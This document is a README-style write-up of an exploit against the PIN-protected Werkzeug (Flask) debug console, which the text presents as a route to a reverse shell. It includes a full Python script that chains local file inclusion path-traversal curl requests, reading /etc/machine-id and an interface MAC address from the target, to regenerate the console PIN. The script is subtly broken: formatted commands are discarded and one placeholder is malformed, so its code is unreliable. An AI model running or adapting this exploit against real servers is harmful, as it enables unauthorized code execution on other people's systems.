# Werkzeug Console Pin Exploit
Yet another Werkzeug Console Pin Exploit Explanation.

## Description

As explained by Carlos Polop in [Hacktricks.xyz](https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug), this exploit is to access /console from Werkzeug when it requires a pin. This Console is a debug console that is Python based, which means, once you access this debug console, you could launch a reverse shell.

In this case, we are taking the exploit script a step further and we are relying on subprocess to reuse the HTTP request made through by using curl. Doing this, helps in dynamically getting the victim server information remotely and without relying on python's urllib to make these HTTP requests.

## Pin Protected
Once you find out Werkzeug Console is pin-protected, you need to find a way to get this pin and access the debug console, right? Well, other people had put some effort in getting this, which is the base of my work here.

Here you can find how to generate this pin:
* [Daehee Park' Werkzeug Console PIN Exploit](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [https://ctftime.org/writeup/17955](https://ctftime.org/writeup/17955)

## Generating the pin
These exploits were developed after reviewing [Werkzeug source code repo](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py) to better understand how the code is generated to then reverse it.

The following is the function that generates the pin in Werkzeug from __init__.py.


```python
def get_pin_and_cookie_name(app):
    pin = os.environ.get('WERKZEUG_DEBUG_PIN')
    rv = None
    num = None

    # Pin was explicitly disabled
    if pin == 'off':
        return None, None

    # Pin was provided explicitly
    if pin is not None and pin.replace('-', '').isdigit():
        # If there are separators in the pin, return it directly
        if '-' in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, '__module__',
                      getattr(app.__class__, '__module__'))

    try:
        # `getpass.getuser()` imports the `pwd` module,
        # which does not exist in the Google App Engine sandbox.
        username = getpass.getuser()
    except ImportError:
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, '__name__', getattr(app.__class__, '__name__')),
        getattr(mod, '__file__', None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [
        str(uuid.getnode()),
        get_machine_id(),
    ]

    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, text_type):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv, cookie_name
```

From this function, the following variables need to be exploited to get the console PIN:

```python
probably_public_bits = [
    username,
    modname,
    getattr(app, '__name__', getattr(app.__class__, '__name__')),
    getattr(mod, '__file__', None),
]

private_bits = [
    str(uuid.getnode()),
    get_machine_id(),
]
```

Where:
* `username` is the user who started this Flask (Werkzeug)
* `modname` is flask.app
* `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` is Flask
* `getattr(mod, '__file__', None)` is the absolute path of `app.py` in the flask directory \(e.g. `/usr/local/lib/python3.5/dist-packages/flask/app.py`\). If `app.py` doesn't work, try `app.pyc`
* `uuid.getnode()` is the MAC address of the current computer, `str (uuid.getnode ())` is the decimal expression of the mac address
* `get_machine_id()` read the value in `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` and return directly if there is, sometimes it might be required to append a piece of information within `/proc/self/cgroup` that you find at the end of the first line \(after the third slash\)

To find server MAC address, need to know which network interface is being used to serve the app \(e.g. `ens3`\). If unknown, leak `/proc/net/arp` for device ID and then leak MAC address at `/sys/class/net/<inface>/address`.

As an example, the MAC address has to be converted from base16 (*Hexadecimal*) interger to a base10 interger (*decimal*).
For example:

```python
>>> print(0x5600027a23ac)
94558041547692
```

## Jumping ahead to the script
Instead of writing the script with the explicit values, we relied on check_output to return the values from the HTTP request performed by curl. The HTTP requests will retrieve the *MAC Address* and the *machine-id* by relying on a *local file inclusion* vulnerability

```python
user = ''   # Username to authenticate to Werkzeug
passwd = '' # Password to authenticate to Werkzeug
iface = ''  # Interface name from the remote system (ens33, eth{0,1,...}, etc)
rhost = ''  # IP address or hostname of the remote system hosting Werkzeug
rport = ''  # Remote Port number of the service to access should be an integer, not a string.
lfi_page_dir = ''

werk_user = ''  # User Werkzeug runs as. Could be the same as the user for the HTTP Request.

maccmd = "/usr/bin/curl -sX GET \
    --url 'http://{2}:{3}/{4}?filename=../../../../../sys/class/net/{5}/address' \
        -u '{0}:{1}' | tr -d ':' | tr -d '\n'"
idcmd = "/usr/bin/curl -sX GET \
    --url 'http://{2}:{3}}/{4}?filename=../../../../../etc/machine-id' \
        -u '{0}:{1}' | tr -d '\n'"

maccmd.format(user, passwd, rhost, rport, lfi_page_dir, iface)
idcmd.format(user, passwd, rhost, rport, lfi_page_dir)

get_node = str(int(subprocess.check_output(maccmd.strip(), shell=True, text=True), base=16))
get_machine_id = subprocess.check_output(idcmd.strip(), shell=True, text=True)
```

* user -> Username to authenticate to Werkzeug
* passwd -> Password to authenticate to Werkzeug
* iface -> Interface name from the remote system (ens33, eth{0,1,...}, etc)
* rhost -> IP address or hostname of the remote system hosting Werkzeug
* rport -> Remote Port number of the service to access should be an integer, not a string.
* lfi_page_dir -> The page or directory to exploit LFI
* werk_user -> User Werkzeug runs as, or the user Flask was launched. Could be the same as the user for the HTTP Request.
* get_node -> will execute the OS command and retrieve the output which is the MAC Address of the interface listening, to then strip any potential trailing newlines that were not remove by ```tr -d '\n'```. Then it will cast the string output to a decimal interger by specifying its base as hexadecimal. This corresponds to ```uuid.getnode() -> /sys/class/net/<interface>/address```.
* get_machine_id -> will execute the OS command and retrieve the output which in this case is the machine-id. This corresponds to ```get_machine_id() -> /etc/machine-id```.

The interfaces on the server hosting Werkzeug can be retrieved by using something like:

```shell
curl -sX GET --url 'http://10.10.10.10:5000/file?filename=../../../../../proc/self/net/dev' -u 'user:password123' | grep -E '^\s*ens*|^\s*eth*'
```

The following are the variables mentioned which now use the specific variables such as werk_user, get_node, and get_machine_id.

```python
probably_public_bits = [
    werk_user,
    'flask.app',
    'Flask',
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc'
    ]

private_bits = [
    get_node,
    get_machine_id
]
```

## The Script

```python
#!/usr/bin/env python3

import subprocess
import hashlib
from itertools import chain

user = ''
passwd = ''
iface = ''
rhost = ''
rport = ''
lfi_page_dir = ''
werk_user = ''

maccmd = "/usr/bin/curl -sX GET \
    --url 'http://{2}:{3}/{4}?filename=../../../../../sys/class/net/{5}/address' \
        -u '{0}:{1}' | tr -d ':' | tr -d '\n'"
idcmd = "/usr/bin/curl -sX GET \
    --url 'http://{2}:{3}}/{4}?filename=../../../../../etc/machine-id' \
        -u '{0}:{1}' | tr -d '\n'"

maccmd.format(user, passwd, rhost, rport, lfi_page_dir, iface)
idcmd.format(user, passwd, rhost, rport, lfi_page_dir)

get_node = str(int(subprocess.check_output(maccmd.strip(), shell=True, text=True), base=16))
get_machine_id = subprocess.check_output(idcmd.strip(), shell=True, text=True)

probably_public_bits = [
    werk_user,
    'flask.app',
    'Flask',
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc'
    ]

private_bits = [
    get_node,
    get_machine_id
    ]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
